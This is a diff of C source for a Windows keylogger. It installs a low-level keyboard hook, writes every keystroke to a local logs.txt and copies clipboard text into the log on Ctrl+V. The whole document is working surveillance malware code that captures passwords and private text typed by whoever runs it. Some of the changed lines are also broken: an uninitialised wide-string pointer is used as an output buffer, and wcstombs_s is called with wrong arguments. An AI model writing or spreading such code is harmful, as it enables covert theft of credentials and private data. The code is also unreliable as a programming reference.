@@ -1,3 +1,4 @@
+#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -13,10 +14,10 @@ BOOL capsLockActivated = FALSE;
 HWND currentWindow;
 
 char* handleSpecialCase(DWORD vkCode);
-int openOrCreateFile(char* filename);
+HANDLE openOrCreateFile(char* filename);
 int getFolderStringLength (TCHAR* str);
 
-int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
+int writeLogs (KBDLLHOOKSTRUCT kbdStruct)
 {
     HANDLE hFile;
     DWORD dwBytesWritten;
@@ -27,8 +28,8 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
 
     if(!GetModuleFileName(NULL, modulePath, MAX_PATH))
     {
-        printf("Cannot find module (%d)\n", GetLastError());
-        return;
+        printf("Cannot find module (%lu)\n", GetLastError());
+        return -1;
     }
     strncpy_s(moduleFolder, MAX_PATH, modulePath, getFolderStringLength(modulePath));
     snprintf(logsPath, MAX_PATH, "%s\\logs.txt", moduleFolder);
@@ -73,6 +74,7 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
         GetKeyState(VK_SHIFT);
         GetKeyState(VK_MENU);
         GetKeyboardState(keyboardState);
+        LPWSTR outputStore;
         // if control is up do not use tounicode to bypass control characters
         if (GetKeyState(VK_CONTROL) & SHIFTED)
         {
@@ -80,15 +82,26 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
             charString[1] = '\0';
         }
         else
-            ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, charString, 8, 0, GetKeyboardLayout(threadId));
+            ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, outputStore, 8, 0, GetKeyboardLayout(threadId));
+        wcstombs_s(charString, outputStore, 500);
+        WriteFile( 
+            hFile,
+            charString,
+            strlen(charString),
+            &dwBytesWritten,
+            NULL);
+    }
+    else
+    {
+        WriteFile( 
+            hFile,
+            specialCase,
+            strlen(specialCase),
+            &dwBytesWritten,
+            NULL);
+
     }
 
-    WriteFile( 
-        hFile,
-        specialCase == NULL ? charString : specialCase,
-        specialCase == NULL ? strlen(charString) : strlen(specialCase),
-        &dwBytesWritten,
-        NULL);
 
     // If a control key + v is pressed, print clipboard to logs
     if ((GetKeyState(VK_CONTROL) & SHIFTED) && kbdStruct.vkCode == 86)
@@ -96,9 +109,9 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
         HGLOBAL   clipboardData; 
         LPTSTR    clipboardString;
         if (!IsClipboardFormatAvailable(CF_TEXT)) 
-            return; 
+            return -1; 
         if (!OpenClipboard(foreground)) 
-            return; 
+            return -1; 
 
         clipboardData = GetClipboardData(CF_TEXT);
         if (clipboardData != NULL) 
@@ -143,14 +156,14 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
             shiftIsHeld = TRUE;
         if (kbdStruct.vkCode == VK_CAPITAL)
             capsLockActivated = !capsLockActivated;
-        writeLogs(kbdStruct, lParam);
+        writeLogs(kbdStruct);
     }
  
 	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
  
-void SetHook()
+void SetHook(void)
 {
 	// Set the hook and set it to use the callback function above
 	// WH_KEYBOARD_LL means it will set a low level keyboard hook
@@ -160,12 +173,12 @@ void SetHook()
 	}
 }
  
-void ReleaseHook()
+void ReleaseHook(void)
 {
 	UnhookWindowsHookEx(_hook);
 }
  
-void main()
+void main(void)
 {
 
     // Infinite loop listening for messages
